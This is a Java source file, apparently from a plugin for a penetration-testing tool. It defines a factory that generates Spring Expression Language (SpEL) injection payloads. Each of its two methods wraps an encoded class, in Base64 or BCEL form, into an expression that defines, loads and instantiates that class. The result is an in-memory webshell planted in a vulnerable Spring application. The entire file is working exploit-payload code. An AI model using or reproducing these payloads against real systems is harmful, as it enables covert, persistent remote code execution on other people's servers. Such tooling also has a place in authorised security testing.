package me.gv7.woodpecker.plugin.utils;

public class SpELMemShellFactory {
    public static String genSpringMemShell1(byte[] memShellClass) throws Exception {
        MemShellClassFactory classFactory = new MemShellClassFactory(memShellClass, MemShellClassFactory.BASE64);
        return "#{T(org.springframework.cglib.core.ReflectUtils).defineClass('" + classFactory.getClassName() + "',T(org.springframework.util.Base64Utils).decodeFromString('" + classFactory.getPayload() + "'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).newInstance()}";
    }

    public static String genSpringMemShell2(byte[] memShellClass) throws Exception {
        MemShellClassFactory classFactory = new MemShellClassFactory(memShellClass, MemShellClassFactory.BCEL);
        return "#{new com.sun.org.apache.bcel.internal.util.ClassLoader(new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).loadClass('" + classFactory.getPayload() + "').newInstance()}";
    }
}
